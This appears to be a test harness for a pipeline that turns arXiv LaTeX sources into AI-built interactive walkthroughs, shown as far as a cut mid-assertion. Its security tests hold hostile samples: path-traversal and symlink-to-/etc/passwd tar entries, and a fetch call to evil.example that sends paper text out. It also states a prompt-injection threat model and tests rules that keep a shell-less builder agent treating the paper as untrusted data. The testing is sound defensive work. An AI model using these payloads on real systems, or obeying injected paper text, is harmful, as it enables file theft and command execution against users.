// Verification harness for the walkthrough pipeline.
//
// Covers everything that needs neither the network nor a model: package
// classification, tar-extraction path safety (a security test, not a nicety),
// the distiller's LaTeX handling, build cache-key identity, the outline trust
// boundary, and the bundle's external-origin scanner. Runs against an isolated
// temporary data dir — it never touches real data and never spends a call.
//
// Run:  npm run verify:walkthrough --prefix server
// Exits non-zero if any check fails.
//
// Fixtures are synthetic rather than copies of real papers: they encode the
// same structural facts measured on 1706.03762 (a multi-file \input tree under
// a \documentclass root) and hep-th/9711200 (plain TeX with harvmac, no
// \documentclass and no \begin{document}) without committing someone else's
// paper or making the test depend on arXiv being up.

import fs from 'fs';
import os from 'os';
import path from 'path';
import zlib from 'zlib';

let passed = 0;
let failed = 0;

function ok(cond: boolean, msg: string) {
  if (cond) {
    passed++;
  } else {
    failed++;
    console.error(`  ✗ ${msg}`);
  }
}

/** Build a tar archive in memory, so extraction can be tested without fixtures. */
function makeTar(entries: { name: string; body?: string; type?: string; size?: number }[]): Buffer {
  const blocks: Buffer[] = [];
  for (const entry of entries) {
    const body = Buffer.from(entry.body ?? '', 'utf8');
    const header = Buffer.alloc(512);
    header.write(entry.name.slice(0, 100), 0, 'utf8');
    header.write('000644 \0', 100);
    header.write('000000 \0', 108);
    header.write('000000 \0', 116);
    // Declared size may be overridden to test a lying header.
    header.write((entry.size ?? body.length).toString(8).padStart(11, '0') + ' ', 124);
    header.write('00000000000 ', 136);
    header.write(entry.type ?? '0', 156);
    header.write('ustar\0', 257);
    header.write('00', 263);
    // Checksum: spaces during computation, then the octal sum.
    header.write('        ', 148);
    let sum = 0;
    for (const b of header) sum += b;
    header.write(sum.toString(8).padStart(6, '0') + '\0 ', 148);

    blocks.push(header);
    const padded = Buffer.alloc(Math.ceil(body.length / 512) * 512);
    body.copy(padded);
    if (padded.length) blocks.push(padded);
  }
  blocks.push(Buffer.alloc(1024)); // end-of-archive
  return Buffer.concat(blocks);
}

(async () => {
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'walkthrough-verify-'));
  process.env.SUITE_DATA_ROOT = tmp;

  // Imported after SUITE_DATA_ROOT is set: these modules resolve DATA_DIR at load.
  const {
    parseContentDisposition,
    sniffContainer,
    gzipOriginalName,
    parseTar,
    isSafeEntryPath,
    classifyFile,
    extractEntries,
  } = await import('../src/services/texsource');

  const {
    stripComments,
    detectMainFile,
    findInputTargets,
    resolveInputPath,
    flattenInputs,
    captureMacros,
    extractStructure,
    extractLabels,
    extractFigures,
    extractCitations,
    applyBudget,
    looksLikeMacroFile,
    distillSource,
  } = await import('../src/services/texdistill');

  const {
    normalizeOutline,
    walkthroughCacheKey,
    scanForExternalOrigins,
    checkBundleStructure,
    checkScriptSyntax,
    BUILD_PROMPT,
    BUILDER_TOOLS,
    buildOutlineCliArgs,
    buildBuilderArgs,
    seedScratchDir,
    stableStringify,
    interpretStreamLine,
    MAX_SCENES,
  } = await import('../src/services/walkthrough');

  const { CONTRACT_VERSION, CONTRACT_MD, HELPER_JS, HELPER_CSS } = await import(
    '../src/services/walkthrough-contract'
  );

  // ---------------------------------------------------------------- Phase 1
  console.log('Phase 1 — package classification (the three measured shapes)\n');

  ok(
    parseContentDisposition('attachment; filename="arXiv-1706.03762v7.tar.gz"').version === 'v7',
    'reads the served version out of a .tar.gz filename'
  );
  ok(
    parseContentDisposition('attachment; filename="arXiv-hep-th9711200v3.gz"').version === 'v3',
    'reads the version out of a bare .gz filename'
  );
  ok(
    parseContentDisposition('attachment; filename=arXiv-2312.11805v1.pdf').filename ===
      'arXiv-2312.11805v1.pdf',
    'handles an unquoted filename (PDF-only submission)'
  );
  ok(
    parseContentDisposition(null).filename === null,
    'a missing content-disposition is not an error'
  );

  ok(sniffContainer(Buffer.from([0x1f, 0x8b, 0x08, 0x00])) === 'gzip', 'sniffs gzip magic bytes');
  ok(sniffContainer(Buffer.from('%PDF-1.5 rest')) === 'pdf', 'sniffs a PDF, so a PDF-only submission is detected even without the filename');
  ok(sniffContainer(makeTar([{ name: 'a.tex', body: 'x' }])) === 'tar', 'sniffs ustar at offset 257');
  ok(sniffContainer(Buffer.from('\\documentclass{article}')) === 'text', 'falls through to a bare TeX file');

  const gz = zlib.gzipSync(Buffer.from('\\input harvmac'), {} as any);
  ok(gzipOriginalName(gz) === null, 'no FNAME flag means no original name');
  // Hand-build a gzip header carrying FNAME, the way arXiv's bare .gz does.
  const named = Buffer.concat([
    Buffer.from([0x1f, 0x8b, 0x08, 0x08, 0, 0, 0, 0, 0, 3]),
    Buffer.from('conffo.tex\0', 'latin1'),
    gz.subarray(10),
  ]);
  ok(gzipOriginalName(named) === 'conffo.tex', 'recovers the original filename from the gzip header');

  // ---------------------------------------------------------------- Phase 2
  console.log('Phase 2 — tar extraction path safety (security)\n');

  ok(!isSafeEntryPath('../../etc/passwd'), 'rejects parent-directory traversal');
  ok(!isSafeEntryPath('/etc/passwd'), 'rejects absolute paths');
  ok(!isSafeEntryPath('a/../../b.tex'), 'rejects traversal buried mid-path');
  ok(!isSafeEntryPath('C:\\windows\\x.tex'), 'rejects Windows drive letters');
  ok(!isSafeEntryPath('bad\0name.tex'), 'rejects NUL bytes in a name');
  ok(isSafeEntryPath('Figures/ModalNet-21.png'), 'accepts an ordinary nested path');
  ok(isSafeEntryPath('./intro.tex'), 'accepts a leading ./');

  const destDir = path.join(tmp, 'extract-test');
  fs.mkdirSync(destDir, { recursive: true });
  const hostile = makeTar([
    { name: '../escape.tex', body: 'pwned' },
    { name: '/abs.tex', body: 'pwned' },
    { name: 'link.tex', body: '/etc/passwd', type: '2' },
    { name: 'dev', body: '', type: '3' },
    { name: 'good.tex', body: '\\documentclass{article}\\begin{document}hi\\end{document}' },
    { name: 'fig.png', body: 'PNGDATA' },
    { name: 'build.log', body: 'noise' },
  ]);
  const result = extractEntries(parseTar(hostile), destDir);

  ok(!fs.existsSync(path.join(tmp, 'escape.tex')), 'a `..` entry never lands outside the destination');
  ok(!fs.existsSync('/abs.tex'), 'an absolute-path entry is not written');
  ok(!fs.existsSync(path.join(destDir, 'link.tex')), 'symlink entries are skipped entirely');
  ok(!fs.existsSync(path.join(destDir, 'dev')), 'device-node entries are skipped entirely');
  ok(fs.existsSync(path.join(destDir, 'good.tex')), 'the legitimate .tex is extracted');
  ok(fs.existsSync(path.join(destDir, 'fig.png')), 'a raster figure is extracted');
  ok(!fs.existsSync(path.join(destDir, 'build.log')), 'build detritus is not extracted');
  ok(
    result.entryNames.includes('build.log'),
    'unextracted entries are still named in the manifest (figure resolution needs them)'
  );
  ok(
    result.warnings.some(w => /unsafe path/i.test(w)) &&
      result.warnings.some(w => /link entry/i.test(w)),
    'rejections are recorded as warnings rather than swallowed'
  );

  ok(classifyFile('ms.tex') === 'tex', 'classifies .tex');
  ok(classifyFile('nips_2017.sty') === 'style', 'classifies .sty');
  ok(classifyFile('refs.bib') === 'bib', 'classifies .bib');
  ok(classifyFile('f.png') === 'raster', 'classifies a raster');
  ok(classifyFile('fig.pdf') === null, 'vector figures are not extracted (v1 links them to the PDF page)');
  ok(classifyFile('conffo') === 'tex', 'an extensionless file is treated as TeX (arXiv allows it)');

  // ---------------------------------------------------------------- Phase 3
  console.log('Phase 3 — the distiller\n');

  // Comment stripping
  const commented = [
    'Real text. % this is a comment',
    'A 50\\% improvement stays.',
    '% whole line comment',
    '\\begin{verbatim}',
    '100% of this survives',
    '\\end{verbatim}',
    '\\verb|x % y| stays too',
    'End.',
  ].join('\n');
  const stripped = stripComments(commented);
  ok(!stripped.includes('this is a comment'), 'strips a trailing comment');
  ok(!stripped.includes('whole line comment'), 'strips a whole-line comment');
  ok(stripped.includes('50\\% improvement'), 'an escaped \\% is not a comment');
  ok(stripped.includes('100% of this survives'), 'verbatim content is untouched');
  ok(stripped.includes('\\verb|x % y|'), '\\verb content is untouched');

  ok(
    stripComments('\\begin{comment}\nabandoned draft\n\\end{comment}\nkept').includes('kept') &&
      !stripComments('\\begin{comment}\nabandoned draft\n\\end{comment}\nkept').includes('abandoned'),
    'a comment environment is dropped whole (abandoned drafts are a liability, not context)'
  );

  // Main-file detection, all four tiers
  ok(
    detectMainFile({ 'only.tex': 'hello' }).mainFile === 'only.tex',
    'tier 1: the single .tex file'
  );
  ok(
    detectMainFile({
      'ms.tex': '\\documentclass{article}\\input{intro}',
      'intro.tex': 'Introduction text',
    }).mainFile === 'ms.tex',
    'tier 2: the file with \\documentclass'
  );
  ok(
    detectMainFile({
      'root.tex': '\\begin{document}\\input{body}\\end{document}',
      'body.tex': 'Body text',
    }).mainFile === 'root.tex',
    'tier 3: the file with \\begin{document}'
  );
  const plainTex = detectMainFile({
    'conffo.tex': '\\input harvmac\n' + '\\newsec{Introduction}\n'.padEnd(4000, 'x'),
    'macros.tex': 'short',
  });
  ok(
    plainTex.mainFile === 'conffo.tex' && /plain TeX/i.test(plainTex.reason),
    'tier 4: plain TeX with neither \\documentclass nor \\begin{document} (hep-th/9711200)'
  );

  // \input resolution
  const tree: Record<string, string> = {
    'ms.tex': '\\documentclass{article}\n\\begin{document}\n\\input{introduction}\n\\input{sections/model}\n\\input{missing}\n\\end{document}',
    'introduction.tex': 'Intro body. \\input{deep}',
    'deep.tex': 'Deep body.',
    'sections/model.tex': 'Model body.',
  };
  ok(
    findInputTargets(tree['ms.tex']).join(',') === 'introduction,sections/model,missing',
    'finds every \\input target in source order'
  );
  ok(
    resolveInputPath('introduction', '', tree) === 'introduction.tex',
    'applies the TeX extension rule (\\input{introduction} → introduction.tex)'
  );
  ok(
    resolveInputPath('model', 'sections', tree) === 'sections/model.tex',
    'resolves relative to the including file\'s directory'
  );
  ok(resolveInputPath('nope', '', tree) === null, 'an unresolvable target returns null');

  const flat = flattenInputs('ms.tex', tree);
  ok(flat.text.includes('Intro body.'), 'splices a resolved \\input');
  ok(flat.text.includes('Deep body.'), 'resolves nested \\input recursively');
  ok(flat.text.includes('Model body.'), 'resolves a subdirectory \\input');
  ok(
    flat.warnings.some(w => w.includes('missing')),
    'a missing \\input target is a warning, not a failure (\\input harvmac is normal)'
  );

  const cyclic = { 'a.tex': '\\input{b}', 'b.tex': '\\input{a}' };
  const cycleResult = flattenInputs('a.tex', cyclic);
  ok(
    cycleResult.warnings.some(w => /cycle/i.test(w)),
    'an \\input cycle is detected and reported rather than hanging'
  );

  // This is the regression guard for the shared-regex bug: a /g pattern shared
  // between the loop and its own recursive call rewinds lastIndex and expands
  // forever, which showed up as "Invalid string length" on a real paper.
  const wide: Record<string, string> = { 'root.tex': '' };
  for (let i = 0; i < 12; i++) {
    wide['root.tex'] += `\\input{part${i}}\n`;
    wide[`part${i}.tex`] = `Part ${i} body. \\input{sub${i}}\n`;
    wide[`sub${i}.tex`] = `Sub ${i} body.\n`;
  }
  const wideFlat = flattenInputs('root.tex', wide);
  ok(
    wideFlat.text.length < 20000 && wideFlat.text.includes('Sub 11 body.'),
    'a wide, nested \\input tree expands once per target, not exponentially'
  );

  // Macro capture
  const macroSource = [
    '\\newcommand{\\dmodel}{d_{\\text{model}}}',
    '\\newcommand\\mc[1]{\\mathcal{#1}}',
    '\\newcommand*\\samethanks[1][\\value{footnote}]{\\footnotemark[#1]}',
    '\\renewcommand{\\vec}[1]{\\mathbf{#1}}',
    '\\DeclareMathOperator*{\\argmax}{arg\\,max}',
    '\\def\\s{\\sigma}',
    '\\let\\eps\\epsilon',
    '\\newtheorem{lemma}{Lemma}',
    'Body text using \\dmodel and \\s.',
  ].join('\n');
  const macros = captureMacros(macroSource);
  const names = macros.map(m => m.name);
  ok(names.includes('\\dmodel'), 'captures \\newcommand{\\name}{...}');
  ok(names.includes('\\mc'), 'captures \\newcommand\\name[n]{...}');
  ok(names.includes('\\samethanks'), 'captures a starred \\newcommand with an optional argument');
  ok(names.includes('\\vec'), 'captures \\renewcommand');
  ok(names.includes('\\argmax'), 'captures \\DeclareMathOperator*');
  ok(names.includes('\\s'), 'captures plain-TeX \\def');
  ok(names.includes('\\eps'), 'captures \\let');
  ok(
    macros.find(m => m.name === '\\dmodel')?.source === '\\newcommand{\\dmodel}{d_{\\text{model}}}',
    'macro definitions are kept verbatim, not expanded'
  );

  const distilledMacros = distillSource({ 'ms.tex': macroSource });
  ok(
    distilledMacros.flattenedTex.indexOf('\\newcommand{\\dmodel}') <
      distilledMacros.flattenedTex.indexOf('Body text'),
    'macros are hoisted above the body (they are the notation\'s decoder ring)'
  );

  ok(
    captureMacros(stripComments('%\\newcommand{\\kq}{{q}_k}\n\\newcommand{\\kq}{q}')).length === 1,
    'a commented-out redefinition is not captured (measured: 10 of 1706.03762\'s 26 greppable macros are dead)'
  );

  ok(
    looksLikeMacroFile(
      Array.from({ length: 40 }, (_, i) => `\\def\\m${i}{x}`).join('\n')
    ),
    'a file that is all definitions is recognised as a macro package'
  );
  ok(
    !looksLikeMacroFile('\\section{Introduction}\n' + 'Prose line.\n'.repeat(40)),
    'a file with sections and prose is not a macro package'
  );

  // Structure, labels, figures, citations
  const paper = [
    '\\section{Introduction}',
    'Text.',
    '\\subsection{Background}',
    '\\begin{equation}\\label{eq:attention}',
    'A = \\text{softmax}(QK^T/\\sqrt{d})V',
    '\\end{equation}',
    '\\begin{lemma}\\label{lem:bound}The bound holds.\\end{lemma}',
    '\\begin{figure}\\includegraphics{Figures/arch}\\caption{The architecture.}\\label{fig:arch}\\end{figure}',
    '\\begin{figure}\\begin{tikzpicture}\\draw (0,0);\\end{tikzpicture}\\caption{A diagram.}\\label{fig:tikz}\\end{figure}',
    '\\begin{thebibliography}{9}',
    '\\bibitem{bahdanau2014} Bahdanau et al. Neural machine translation by jointly learning to align and translate.',
    '\\end{thebibliography}',
  ].join('\n');

  const structure = extractStructure(paper);
  ok(structure.length === 2 && structure[0].title === 'Introduction', 'maps \\section');
  ok(structure[1].level === 2, '\\subsection is one level deeper than \\section');
  ok(
    extractStructure('\\newsec{Holography}\n\\subsec{Setup}').length === 2,
    'maps harvmac \\newsec/\\subsec (plain-TeX physics papers have no \\section)'
  );

  const labels = extractLabels(paper);
  ok(labels.some(l => l.label === 'eq:attention' && l.kind === 'equation'), 'finds a labelled equation');
  ok(labels.some(l => l.label === 'lem:bound' && l.kind === 'theorem'), 'finds a labelled theorem');

  const figures = extractFigures(paper, ['Figures/arch.png']);
  ok(figures[0].kind === 'raster' && figures[0].resolvedPath === 'Figures/arch.png', 'resolves a raster figure by basename');
  ok(figures[0].caption === 'The architecture.', 'reads the caption');
  ok(figures[1].kind === 'tikz', 'a TikZ figure is recognised as source, not a missing file');
  ok(
    extractFigures('\\begin{figure}\\includegraphics{vis/x}\\caption{c}\\end{figure}', ['vis/x.pdf'])[0]
      .kind === 'vector',
    'a PDF figure is classified vector (v1 links it to the PDF page)'
  );

  ok(
    extractCitations({}, paper)['bahdanau2014']?.includes('Bahdanau'),
    'reads cite keys from an inline thebibliography (1706.03762 ships all 40 that way)'
  );
  ok(
    !distillSource({ 'ms.tex': paper }).flattenedTex.includes('thebibliography'),
    'the bibliography block is removed from the body'
  );
  ok(
    distillSource({ 'ms.tex': paper + '\nSee \\cite{bahdanau2014}.' }).flattenedTex.includes(
      '\\cite{bahdanau2014}'
    ),
    '\\cite markers survive so a scene can name the work it replaces'
  );

  // Budget
  const appendixDoc =
    '\\section{Body}\n' + 'Body prose. '.repeat(4000) + '\n\\appendix\n\\section{Extra}\n' + 'Appendix prose. '.repeat(4000);
  const budgeted = applyBudget(appendixDoc, 50000);
  ok(budgeted.truncated, 'over-budget input is reported as truncated');
  ok(budgeted.text.includes('Body prose.'), 'the body survives truncation');
  ok(!budgeted.text.includes('Appendix prose.'), 'appendices are dropped first');
  ok(
    budgeted.warnings.some(w => /appendices omitted/i.test(w)),
    'exactly what was dropped is recorded in the warnings'
  );

  const proofDoc =
    '\\section{Body}\n' + 'Statement. '.repeat(3000) +
    '\\begin{proof}' + 'Proof step. '.repeat(4000) + '\\end{proof}';
  const proofBudgeted = applyBudget(proofDoc, 40000);
  ok(
    !proofBudgeted.text.includes('Proof step.') && proofBudgeted.text.includes('Statement.'),
    'proof bodies are dropped before the statements they prove'
  );

  ok(
    applyBudget('short document', 50000).truncated === false,
    'a document under budget is untouched'
  );

  // ---------------------------------------------------------------- Phase 4
  console.log('Phase 4 — the outline trust boundary\n');

  const known = ['eq:attention', 'lem:bound'];
  const rawOutline = {
    fitness: { verdict: 'strong', reason: 'It is a geometry.' },
    thesis: 'Attention alone suffices.',
    scenes: Array.from({ length: 20 }, (_, i) => ({
      title: `Scene ${i}`,
      narration: 'Narration.',
      equations: ['eq:attention', 'eq:invented'],
      visual: { kind: 'geometry', spec: 'Rotate the thing.' },
      sourceRefs: [{ section: '3.2', page: 4 }, { section: '' }],
    })),
  };
  const normalized = normalizeOutline(rawOutline, known);
  ok(normalized.scenes.length === MAX_SCENES, `scene count is capped at ${MAX_SCENES}`);
  ok(
    normalized.scenes[0].equations.join(',') === 'eq:attention',
    'an equation label the paper does not define is dropped'
  );
  ok(normalized.scenes[0].sourceRefs.length === 1, 'a sourceRef with no section is dropped');
  ok(normalized.scenes[0].sourceRefs[0].page === 4, 'a valid page number survives');
  ok(
    normalizeOutline({ ...rawOutline, fitness: { verdict: 'excellent', reason: '' } }, known).fitness
      .verdict === 'none',
    'an out-of-enum fitness verdict falls back to "none" rather than being trusted'
  );
  ok(
    normalizeOutline(
      { fitness: { verdict: 'none', reason: 'A benchmark table.' }, thesis: 't', scenes: [
        { title: 'S', narration: 'n', equations: [], visual: { kind: 'geometry', spec: 'spin' }, sourceRefs: [] },
      ] },
      known
    ).scenes[0].visual.kind === 'none',
    'a "none" verdict cannot smuggle an animated scene through — the gate would be pointless otherwise'
  );
  ok(
    normalizeOutline(
      { ...rawOutline, scenes: [{ ...rawOutline.scenes[0], visual: { kind: 'hologram', spec: 'x' } }] },
      known
    ).scenes[0].visual.kind === 'none',
    'an unknown visual kind falls back to "none"'
  );
  ok(normalizeOutline(null, known).scenes.length === 0, 'garbage input yields an empty outline, not a throw');
  ok(normalizeOutline('nonsense', known).fitness.verdict === 'none', 'a non-object outline is not fit');

  // ---------------------------------------------------------------- Phase 5
  console.log('Phase 5 — build cache-key identity\n');

  const outlineA = normalizeOutline(rawOutline, known);
  const outlineB = JSON.parse(JSON.stringify(outlineA)) as typeof outlineA;
  const keyA = walkthroughCacheKey('sha-source', outlineA, CONTRACT_VERSION);

  ok(keyA === walkthroughCacheKey('sha-source', outlineB, CONTRACT_VERSION), 'same source + same outline + same contract ⇒ same key (the stored bundle is returned, unpaid)');
  outlineB.scenes[0].narration = 'Edited narration.';
  ok(
    keyA !== walkthroughCacheKey('sha-source', outlineB, CONTRACT_VERSION),
    'an edited outline re-keys (an edited outline is a different build)'
  );
  ok(
    keyA !== walkthroughCacheKey('sha-other-source', outlineA, CONTRACT_VERSION),
    'a new arXiv version re-keys'
  );
  ok(
    keyA !== walkthroughCacheKey('sha-source', outlineA, 'different-contract'),
    'changing the contract re-keys, so bundles built to different rules never mix'
  );
  ok(
    stableStringify({ b: 1, a: 2 }) === stableStringify({ a: 2, b: 1 }),
    'key-order differences in an outline do not change the key'
  );

  // Regression guard. The outline pass stores a row; the build pass recomputes
  // the key from (source, outline, contract) to decide whether a bundle already
  // exists. If the stored key were a *seed* key computed before the outline was
  // known, those two would never agree, the cache would never hit, and every
  // press of Build would silently pay for a fresh agentic run. That is exactly
  // what happened once, and it started an unintended build.
  const storedByOutlinePass = walkthroughCacheKey('sha-source', outlineA, CONTRACT_VERSION);
  const recomputedByBuildPass = walkthroughCacheKey('sha-source', outlineA, CONTRACT_VERSION);
  ok(
    storedByOutlinePass === recomputedByBuildPass &&
      storedByOutlinePass !== walkthroughCacheKey('sha-source', null, CONTRACT_VERSION),
    'the key a row is stored under is the outline-derived key, not a seed key the build pass could never recompute'
  );
  ok(/^[0-9a-f]{12}$/.test(CONTRACT_VERSION), 'the contract version is a hash of the contract and helper files');

  // The same property, end to end through the row store: the outline pass
  // writes a row, the build pass looks one up. They must agree.
  const dbMod = await import('../src/services/database');
  dbMod.initializeDatabase();
  dbMod.createWalkthrough({
    arxiv_id: '1706.03762',
    source_version: 'v7',
    source_sha: 'sha-source',
    contract_version: CONTRACT_VERSION,
    cache_key: storedByOutlinePass,
    status: 'pending',
    fitness: 'strong',
    outline: JSON.stringify(outlineA),
    warnings: null,
    model: 'claude-opus-5',
    backend: 'cli',
  });
  ok(
    !!dbMod.getWalkthroughByCacheKey(
      walkthroughCacheKey('sha-source', outlineA, CONTRACT_VERSION)
    ),
    'the build pass finds the row the outline pass wrote, so pressing Build twice does not pay twice'
  );
  ok(
    !dbMod.getWalkthroughByCacheKey(
      walkthroughCacheKey('sha-source', { ...outlineA, thesis: 'edited' }, CONTRACT_VERSION)
    ),
    'an edited outline does not collide with the stored row'
  );

  // ---------------------------------------------------------------- Phase 6
  console.log('Phase 6 — bundle safety (security)\n');

  ok(
    scanForExternalOrigins('<script src="https://cdn.jsdelivr.net/three.js"></script>').length === 1,
    'catches a CDN script'
  );
  ok(
    scanForExternalOrigins('fetch("//evil.example/exfil?d=" + paperText)').length === 1,
    'catches a protocol-relative exfiltration URL'
  );
  ok(
    scanForExternalOrigins('<img src="http://tracker.example/p.gif">').length === 1,
    'catches a tracking pixel'
  );
  ok(
    scanForExternalOrigins('<!-- see https://arxiv.org/abs/1706.03762 -->').length === 0,
    'a URL inside a comment is not a violation'
  );
  ok(
    scanForExternalOrigins('<svg xmlns="http://www.w3.org/2000/svg"></svg>').length === 0,
    'the SVG namespace URI is a declaration, not a fetch'
  );
  ok(
    scanForExternalOrigins(
      '<script src="/api/walkthrough/asset/three.module.js"></script><img src="assets/fig.png">'
    ).length === 0,
    'the vendored asset route and bundle-relative assets are allowed'
  );

  ok(
    checkBundleStructure('<html><body><script>WT.ready()</script>' + 'x'.repeat(600) + '</body></html>').length === 0,
    'a plausible bundle passes the structure check'
  );
  ok(checkBundleStructure('<html></html>').length > 0, 'an empty bundle is rejected');
  ok(
    checkBundleStructure('<html><script>var x=1</script>' + 'y'.repeat(600) + '</html>').some(p =>
      /ready/.test(p)
    ),
    "a bundle that never signals 'ready' is rejected (the host would spin forever)"
  );

  // The validators are what let a non-zero exit code be overridden: they judge
  // the artifact independently of how the process ended. Measured case — a run
  // exited 1 after writing a bundle that passed all three, and the bundle was
  // discarded unexamined.
  const realisticBundle =
    '<!DOCTYPE html><html><head><style>.wt-root{}</style></head><body>' +
    '<div class="wt-root"></div><script>' + HELPER_JS + '</script>' +
    '<script>WT.scenes(document.querySelector(".wt-root"), [{title:"S",render:function(el){' +
    'el.appendChild(WT.equation("x=1")); if(!WT.hasWebGL()) el.appendChild(WT.fallback("no webgl"));' +
    '}}]); WT.ready();</script></body></html>';
  ok(
    scanForExternalOrigins(realisticBundle).length === 0 &&
      checkBundleStructure(realisticBundle).length === 0 &&
      checkScriptSyntax(realisticBundle).length === 0,
    'a bundle built to the contract passes all three validators (so a bad exit code can be overridden safely)'
  );

  // ---------------------------------------------------------------- Phase 7
  console.log('Phase 7 — the CLI flag vectors\n');

  const outlineArgs = buildOutlineCliArgs('SYSTEM');
  const oflag = (n: string) => outlineArgs[outlineArgs.indexOf(n) + 1];
  ok(outlineArgs[0] === '-p', 'the outline runs in non-interactive print mode');
  ok(oflag('--model') === 'claude-opus-5', 'the outline pins Opus 5');
  ok(oflag('--tools') === '', 'the outline disables every tool — it is a text-judgement task');
  ok(oflag('--system-prompt') === 'SYSTEM', 'the outline replaces the coding-agent prompt');
  ok(outlineArgs.includes('--json-schema'), 'the outline constrains output with a JSON schema');
  ok(
    JSON.parse(oflag('--json-schema')).required.includes('fitness'),
    'the schema requires the fitness verdict, so the gate cannot be skipped'
  );
  ok(
    outlineArgs.indexOf('--tools') < outlineArgs.indexOf('--system-prompt'),
    'the variadic --tools flag is followed by another flag, so it cannot swallow a value'
  );

  const builderArgs = buildBuilderArgs(1.5, 'high');
  const bflag = (n: string) => builderArgs[builderArgs.indexOf(n) + 1];
  ok(bflag('--model') === 'claude-opus-5', 'the build pins Opus 5');
  ok(bflag('--effort') === 'high', 'the build runs at the requested effort');

  // The builder reads paper.tex, which is third-party text from arXiv. These
  // three are a security boundary, not a preference: with Bash under
  // bypassPermissions, a hostile preprint containing text shaped like
  // instructions is arbitrary command execution as the user. The bundle's
  // connect-src 'none' is irrelevant here — it constrains the bundle at view
  // time, not the builder at build time.
  ok(!bflag('--tools').includes('Bash'), 'the builder has NO shell (untrusted paper text is in its context)');
  ok(bflag('--tools') === 'Read,Write,Edit', 'the builder gets read/write/edit and nothing more');
  ok(
    !builderArgs.includes('bypassPermissions') && !builderArgs.includes('--dangerously-skip-permissions'),
    'the builder does not bypass permission checks'
  );
  ok(
    bflag('--permission-mode') === 'acceptEdits',
    'edits are auto-accepted inside the scratch dir and refused outside it'
  );
  ok(
    builderArgs.includes('--append-system-prompt') &&
      /untrusted/i.test(bflag('--append-system-prompt')),
    'the builder is told the paper is untrusted data, not instructions'
  );

  // Prompt/tool-set consistency. The prompt is the LAST thing the agent reads,
  // so a stale instruction there outranks CONTRACT.md and strands the run on an
  // impossible step. This exact drift shipped once: Bash was removed from
  // --tools while step 5 still said "Run `node smoke.mjs`", and a live build sat
  // for 11 minutes heading for an instruction it could never satisfy.
  ok(
    bflag('--tools') === BUILDER_TOOLS.join(','),
    'the --tools flag is derived from BUILDER_TOOLS, not written out twice'
  );
  ok(
    !/smoke\.mjs/.test(BUILD_PROMPT),
    'the build prompt does not tell the agent to run a script that is no longer seeded'
  );
  ok(
    !/\brun\s+`|\bnode --check\b|\bnpm \b|\bbash\b/i.test(BUILD_PROMPT),
    'the build prompt asks for no shell command, because the builder has no shell'
  );
  ok(
    /no \*\*shell\*\*|no shell/i.test(BUILD_PROMPT),
    'the build prompt says outright that there is no shell, so the agent does not look for one'
  );
  ok(bflag('--max-budget-usd') === '1.5', 'the build carries a hard cost ceiling');
  ok(bflag('--output-format') === 'stream-json', 'the build streams progress');
  ok(
    builderArgs.includes('--verbose'),
    'the build passes --verbose, which the CLI *requires* alongside stream-json under -p'
  );
  ok(!builderArgs.includes('--bare'), 'the build never uses --bare, which cannot bill the Claude Code plan');
  ok(
    builderArgs.includes('--setting-sources') && bflag('--setting-sources') === '',
    'the build loads no ambient settings, so no SessionStart hook fires into it'
  );
  ok(builderArgs.includes('--strict-mcp-config'), 'the build ignores the user\'s MCP servers');
  ok(
    builderArgs.indexOf('--max-budget-usd') > 0,
    'there is a budget flag at all — there is no --max-turns in CLI 2.1.247'
  );

  // ---------------------------------------------------------------- Phase 8
  console.log('Phase 8 — the scratch directory\n');

  const scratch = path.join(tmp, 'scratch-test');
  seedScratchDir(scratch, {
    paper: { arxivId: '1706.03762', title: 'T', authors: ['A'], abstract: 'Abstract.' },
    distilled: distillSource({ 'ms.tex': paper }),
    outline: outlineA,
    figureFiles: [],
  });
  for (const file of ['CONTRACT.md', 'wt.js', 'wt.css', 'paper.tex', 'outline.json', 'paper.json']) {
    ok(fs.existsSync(path.join(scratch, file)), `seeds ${file}`);
  }
  ok(
    !fs.existsSync(path.join(scratch, 'smoke.mjs')),
    'no smoke.mjs is seeded — the builder has no shell to run it, and the server checks instead'
  );
  ok(
    !fs.existsSync(path.join(scratch, 'CLAUDE.md')),
    'the scratch dir carries no CLAUDE.md — the neutral cwd is what stops project context leaking in'
  );
  ok(
    JSON.parse(fs.readFileSync(path.join(scratch, 'outline.json'), 'utf8')).scenes.length ===
      outlineA.scenes.length,
    'the outline written to the scratch dir is the normalized one'
  );
  ok(HELPER_JS.includes('WT.scenes') && HELPER_JS.includes('WT.fallback'), 'the helper library ships a scene stepper and a fallback');

  // Vendored-asset self-containment. A "vendored" library that phones home at
  // runtime is not vendored, and inside the bundle's sandbox the CSP refuses the
  // request — so the failure is silent and total rather than degraded.
  //
  // Measured: MathJax 4 splits its fonts into chunks fetched from jsDelivr at
  // typeset time. The CSP blocked them (correctly), MathJax threw
  // `dynamic file 'double-struck' failed to load`, abandoned typesetting, and
  // every equation in every walkthrough stayed as raw \(…\) on screen.
  // Deep `require.resolve` is blocked by these packages' "exports" maps, so walk
  // node_modules directly — exactly as `resolveAsset` in the route does.
  const nodeModules = path.join(__dirname, '..', 'node_modules');
  const mathjaxPkg = JSON.parse(
    fs.readFileSync(path.join(nodeModules, 'mathjax', 'package.json'), 'utf8')
  );
  ok(
    /^3\./.test(mathjaxPkg.version),
    `mathjax is pinned to v3 (self-contained SVG fonts); found ${mathjaxPkg.version}. v4 lazy-loads fonts from a CDN and breaks under the bundle CSP.`
  );
  const mathjaxFile = path.join(nodeModules, 'mathjax', 'es5', 'tex-svg.js');
  ok(fs.existsSync(mathjaxFile), 'the vendored MathJax build the asset route serves actually exists');
  const mathjaxSource = fs.readFileSync(mathjaxFile, 'utf8');
  ok(
    !/svg\/dynamic/.test(mathjaxSource) && !/dynamic file/.test(mathjaxSource),
    'the vendored MathJax contains no lazy font loader — fonts are compiled in'
  );
  const threeFile = path.join(nodeModules, 'three', 'build', 'three.module.min.js');
  ok(fs.existsSync(threeFile), 'the vendored three.js build the asset route serves actually exists');
  ok(
    !/cdn\.|unpkg\.com|jsdelivr/.test(fs.readFileSync(threeFile, 'utf8').slice(0, 200000)),
    'the vendored three.js does not reference a CDN'
  );

  // The vendored asset URLs carry no version, so their contents change under a
  // fixed path whenever the pinned dependency does. Marking them `immutable`
  // pinned every already-loaded browser to the old bytes — swapping MathJax 4
  // for 3 fixed nothing for anyone who had opened a walkthrough before.
  const { assetCacheControl } = await import('../src/routes/walkthrough');
  ok(
    !/immutable/.test(assetCacheControl()),
    'vendored assets are not marked immutable — their URLs are not content-addressed'
  );
  ok(
    /no-cache/.test(assetCacheControl()),
